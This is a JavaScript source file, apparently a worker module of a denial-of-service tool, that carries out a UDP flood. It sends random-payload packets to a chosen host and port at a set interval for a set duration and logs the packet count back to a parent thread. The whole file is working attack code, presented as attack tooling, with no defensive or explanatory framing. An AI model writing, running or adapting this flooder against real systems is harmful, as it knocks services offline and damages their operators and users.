import dgram from "dgram";
import { parentPort, workerData } from "worker_threads";

import { randomString } from "../utils/randomUtils.js";

const startAttack = () => {
  const { target, duration, packetDelay, packetSize } = workerData;

  const [targetHost, targetPort] = target.split(":");
  const port = parseInt(targetPort, 10) || 80;
  const fixedTarget = `udp://${targetHost}:${port}`;

  if (port < 1 || port > 65535) {
    throw new Error("Invalid port: Should be between 1 and 65535");
  }

  let totalPackets = 0;
  const startTime = Date.now();

  parentPort.postMessage({
    log: `🚀 Starting UDP flood attack on ${fixedTarget}`,
    totalPackets,
  });

  const sendPacket = () => {
    const client = dgram.createSocket("udp4");
    const payload = Buffer.from(randomString(packetSize));

    client.send(payload, 0, payload.length, port, targetHost, (err) => {
      if (err) {
        parentPort.postMessage({
          log: `❌ Packet failed to ${fixedTarget}: ${err.message}`,
          totalPackets,
        });
      } else {
        totalPackets++;
        parentPort.postMessage({
          log: `✅ UDP Packet sent to ${fixedTarget}`,
          totalPackets,
        });
      }
      client.close();
    });
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    sendPacket();
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
